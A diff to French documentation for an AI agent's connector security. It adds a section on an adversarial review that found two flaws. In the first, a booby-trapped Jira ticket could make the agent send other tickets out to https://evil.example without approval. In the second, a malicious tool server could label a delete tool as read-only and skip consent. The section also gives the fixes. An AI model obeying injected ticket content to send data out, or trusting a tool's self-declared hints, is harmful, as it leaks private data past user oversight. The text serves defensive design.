@@ -94,6 +94,29 @@ bomb**). On ne fait donc jamais confiance aux tailles annoncées : on décompres
 Les chemins (`../../etc/passwd`) ne servent qu'à l'affichage : rien n'est écrit
 sur le disque.
 
+### Revue adversariale : deux failles trouvées en attaquant
+
+Relire son code en **attaquant** (« comment je contournerais ça ? ») a trouvé deux
+failles que les tests ne voyaient pas, parce qu'ils vérifiaient ce qui devait
+marcher, pas ce qu'un attaquant tenterait :
+
+1. **La donnée d'un connecteur est privée.** La règle de deux (fiche 13) demande
+   l'accord quand un contenu non fiable ET une donnée interne sont réunis. Un
+   ticket Jira est les deux à la fois : écrit par un client, lu avec ton compte.
+   Il n'était compté que « non fiable » ; un ticket piégé pouvait donc faire
+   ouvrir `https://evil.example/?d=<autres tickets>` sans rien demander.
+   Correction : il compte aussi comme privé. Pour ne pas noyer l'utilisateur
+   sous les demandes, la donnée peut **retourner au même connecteur** (elle ne
+   change pas de mains) ; vers le web ou un autre service, l'accord est demandé.
+2. **Une déclaration n'est pas une preuve.** `readOnlyHint` est écrit par
+   l'éditeur du serveur. Un serveur malveillant peut déclarer `delete_page` en
+   lecture : approuvé ainsi, il s'exécuterait sans accord. Correction : un nom
+   de modification l'emporte sur la déclaration, l'outil est signalé, et ce qui
+   sera approuvé reste visible.
+
+Le réflexe à retenir : chaque test d'attaque doit **échouer sans la correction**.
+Sinon, il ne prouve rien. C'est vérifié ici : sans le correctif, 3 tests tombent.
+
 ### Dans le studio de l'agent : choisir ce qu'il peut faire
 
 Le studio présente une section **« Ce que l'agent peut faire »**, avec une ligne
@@ -114,4 +137,6 @@ consigne ou un outil se juge en situation, sur une vraie question.
 - Enregistrement dynamique quand l'éditeur le permet ; sinon une application à créer.
 - Rien n'agit sans examen des outils par un administrateur ; lecture seule par défaut.
 - Une fiche, des étapes visibles, une seule action principale à la fois.
+- La donnée d'un connecteur est à la fois non fiable et privée.
+- Ce qu'un tiers déclare (readOnlyHint) est un indice, jamais une garantie.
 - Un zip se lit en flux, avec des plafonds sur ce qui sort vraiment.
